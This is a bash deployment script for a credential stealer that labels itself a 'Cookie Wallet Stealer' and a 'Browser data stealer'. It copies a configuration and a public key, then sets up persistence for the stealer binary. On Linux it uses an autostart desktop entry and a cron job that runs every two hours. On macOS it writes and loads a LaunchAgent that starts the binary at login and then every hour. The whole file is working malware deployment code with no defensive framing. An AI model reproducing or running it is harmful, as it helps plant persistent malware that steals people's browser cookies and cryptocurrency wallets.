#!/bin/bash

set -e

BINARY="stealer_linux"
OUTPUT_DIR="./stealer_data"

echo "=== Cookie Wallet Stealer Deploy ==="

if [ ! -f "$BINARY" ]; then
  echo "Error: Binary not found: $BINARY"
  exit 1
fi

echo "Creating output directory..."
mkdir -p "$OUTPUT_DIR"

echo "Copying config..."
cp stealer_config.json "$OUTPUT_DIR/" 2>/dev/null || true
cp public_key.pem "$OUTPUT_DIR/" 2>/dev/null || true

if [ "$(uname)" = "Linux" ]; then
  echo "Setting up Linux persistence..."

  STARTUP_DIR="$HOME/.config/autostart"
  mkdir -p "$STARTUP_DIR"
  
  cat > "$STARTUP_DIR/cookie-stealer.desktop" << EOF
[Desktop Entry]
Type=Application
Exec=$BINARY
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=CryptoStealer
Comment=Browser data stealer
EOF

  CRON_LINE="0 */2 * * * $BINARY >> $OUTPUT_DIR/stealer.log 2>&1"
  (crontab -l 2>/dev/null | grep -q "cookie-stealer" || echo "$CRON_LINE") | crontab -

  echo " Linux cron job created"
fi

if [ "$(uname)" = "Darwin" ]; then
  echo "Setting up macOS persistence..."

  LAUNCH_DIR="$HOME/Library/LaunchAgents"
  mkdir -p "$LAUNCH_DIR"

  cat > "$LAUNCH_DIR/com.cookie-stealer.plist" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.cookie-stealer</string>
  <key>ProgramArguments</key>
  <array>
    <string>$BINARY</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>StartInterval</key>
  <integer>3600</integer>
</dict>
</plist>
EOF

  launchctl load "$LAUNCH_DIR/com.cookie-stealer.plist"

  echo " macOS LaunchAgent loaded"
fi

echo "=== Deployment Complete ==="
echo "Output directory: $OUTPUT_DIR"